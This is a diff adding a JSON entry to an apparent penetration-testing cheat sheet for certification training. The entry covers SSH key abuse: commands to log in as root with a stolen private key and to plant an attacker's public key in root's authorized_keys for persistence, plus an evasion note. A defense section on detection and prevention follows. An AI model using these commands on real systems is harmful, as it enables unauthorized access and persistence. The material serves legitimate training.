@@ -1,0 +1,85 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "ssh"
+  ],
+  "tools": [
+    "ssh",
+    "ssh-keygen"
+  ],
+  "tags": [
+    "ssh-keys",
+    "privesc",
+    "persistence"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Basics",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 02: Getting Started",
+  "examples": [
+    {
+      "label": "Log in with a stolen private key",
+      "command": "chmod 600 id_rsa && ssh root@10.129.42.253 -i id_rsa"
+    }
+  ],
+  "notes": "Key paths: /home/<user>/.ssh/id_rsa, /root/.ssh/id_rsa, {/home/<user>,/root}/.ssh/authorized_keys. Private key must be chmod 600.",
+  "references": [
+    {
+      "title": "HTB Academy - Getting Started",
+      "url": "https://academy.hackthebox.com/module/details/77"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gs-ssh",
+      "rel": "next",
+      "note": "SSH in with the recovered key."
+    }
+  ],
+  "id": "gs-ssh-key-abuse",
+  "name": "Privilege Escalation - SSH Key Abuse",
+  "command": "ssh <user>@<ip> -i id_rsa",
+  "description": "A recovered private key gives instant access as its owner. If you can write a user's authorized_keys, add your own public key for guaranteed login.",
+  "variations": [
+    {
+      "label": "Use a stolen private key",
+      "command": "vim id_rsa\nchmod 600 id_rsa\nssh root@<ip> -i id_rsa"
+    },
+    {
+      "label": "Plant your own key",
+      "command": "ssh-keygen -f key\necho \"ssh-rsa AAAAB...M= user@parrot\" >> /root/.ssh/authorized_keys\nssh root@<ip> -i key"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1552.004"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Adversaries search for private cryptographic key files (.key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer) in common directories like ~/.ssh. When found without passphrases (or with crackable ones), these keys provide direct authentication to SSH services and decrypt other collected files — all without knowing the user's login password.",
+    "prerequisites": "Read access to a user's ~/.ssh (or other key stores) on a compromised host.",
+    "impact": "Usable private keys granting SSH access as that user to this or other hosts — lateral movement without cracking a password.",
+    "detection": "Monitor for process access to private key files in user profile paths (e.g., ~/.ssh/) followed by potential network connections or compression activity. Script-based access to key directories followed by unusual shell activity or outbound connections is especially significant.",
+    "artifacts": "Access to ~/.ssh/id_* files; subsequent key-based SSH authentication entries; find/grep for key extensions in shell history.",
+    "prevention": "Ensure only authorized keys are allowed access and audit access lists regularly. When possible, store keys on separate cryptographic hardware (e.g., TPM) rather than on the local filesystem. Use strong passphrases for private keys to make offline cracking difficult. Restrict file and directory permissions on folders containing private keys.",
+    "evasion": "Key-based authentication with a recovered private key looks identical to legitimate key auth — no password failures, no brute-force signature — so it blends with normal SSH activity.",
+    "sources": [
+      "MITRE T1552.004"
+    ],
+    "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
+    "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces — should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
+    "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
+  }
+}
